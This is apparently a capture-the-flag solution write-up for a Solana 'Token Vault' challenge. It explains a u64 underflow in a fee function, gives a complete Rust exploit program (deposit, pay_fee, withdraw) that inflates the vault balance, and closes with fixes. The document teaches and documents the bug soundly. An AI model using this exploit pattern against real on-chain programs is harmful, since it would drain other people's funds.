# Solution for Challenge 1: Token Vault

## Vulnerability Analysis

The vulnerability lies in the `process_pay_fee` function in `program/src/processor.rs`:

```rust
// Constants
pub const MAINTENANCE_FEE: u64 = 150;
pub const VIP_THRESHOLD: u64 = 100;

// In process_pay_fee:
if vault.balance >= VIP_THRESHOLD {  // Only checks >= 100
    msg!("Processing VIP maintenance fee of {} lamports", MAINTENANCE_FEE);
    vault.balance -= MAINTENANCE_FEE;  // But subtracts 150!
    // ...
}
```

### The Bug

1. **The check**: Only verifies that `vault.balance >= 100`
2. **The operation**: Subtracts `150` from the balance
3. **The problem**: If balance is between 100-149, this causes **integer underflow**!

Since `vault.balance` is a `u64` and `overflow-checks = false` in the release build (see `Cargo.toml`), Rust doesn't panic on overflow/underflow. Instead, it wraps around.

### Underflow Math

When you subtract 150 from 100 in unsigned arithmetic with wrapping:
```
100 - 150 = 18,446,744,073,709,551,566 (u64::MAX - 49)
```

This is the classic integer underflow vulnerability!

## Exploit Strategy

1. **Start**: User has 200 lamports
2. **Deposit 100**: Vault balance = 100, user lamports = 100
3. **Call pay_fee**: Triggers underflow → vault.balance = 18,446,744,073,709,551,566
4. **Withdraw**: Get all those lamports back to user account
5. **Win**: User now has way more than 1,000,000 lamports!

## Exploit Code

```rust
use solana_program::{
    account_info::AccountInfo,
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    pubkey::Pubkey,
};

use token_vault::{deposit, pay_fee, withdraw};

entrypoint!(process);

fn process(program_id: &Pubkey, accounts: &[AccountInfo], _data: &[u8]) -> ProgramResult {
    msg!("Starting exploit...");
    
    // Account 0: Vault program ID
    // Account 1: User account
    let vault_program = accounts[0].key;
    let user = accounts[1].key;
    
    msg!("Step 1: Deposit 100 lamports to reach VIP threshold");
    invoke(
        &deposit(*vault_program, *user, 100),
        accounts,
    )?;
    
    msg!("Step 2: Trigger pay_fee to cause integer underflow");
    invoke(
        &pay_fee(*vault_program, *user),
        accounts,
    )?;
    
    msg!("Step 3: Withdraw the massive balance");
    invoke(
        &withdraw(*vault_program, *user),
        accounts,
    )?;
    
    msg!("Exploit complete!");
    Ok(())
}
```

## Why This Works

1. **Deposit 100**: Vault balance becomes exactly 100 lamports
2. **Pay Fee**: 
   - Check passes: `100 >= 100` ✓
   - Subtraction: `100 - 150` wraps to `u64::MAX - 49`
   - Vault balance is now astronomical!
3. **Withdraw**: Transfer all those lamports back to user
4. **Profit**: User balance > 1,000,000 → Get flag!

## Lessons Learned

### For Players:
1. **Integer Overflow/Underflow**: Always check arithmetic operations on unsigned types
2. **Rust Release Mode**: By default, Rust doesn't check for overflows in release builds
3. **Logic Flaws**: Even if each check seems reasonable, their combination can be dangerous

### For Developers (How to Fix):
1. **Use checked arithmetic**:
   ```rust
   vault.balance = vault.balance.checked_sub(MAINTENANCE_FEE)
       .ok_or(ProgramError::InsufficientFunds)?;
   ```

2. **Add proper validation**:
   ```rust
   if vault.balance < MAINTENANCE_FEE {
       return Err(ProgramError::InsufficientFunds);
   }
   vault.balance -= MAINTENANCE_FEE;
   ```

3. **Enable overflow checks** in `Cargo.toml`:
   ```toml
   [profile.release]
   overflow-checks = true
   ```

4. **Design consistent thresholds**: Fee should never exceed the threshold!

## References
- [Rust Overflow Checking](https://doc.rust-lang.org/book/ch03-02-data-types.html#integer-overflow)
- [Solana Program Security](https://docs.solana.com/developing/on-chain-programs/developing-rust#overflow-checks)

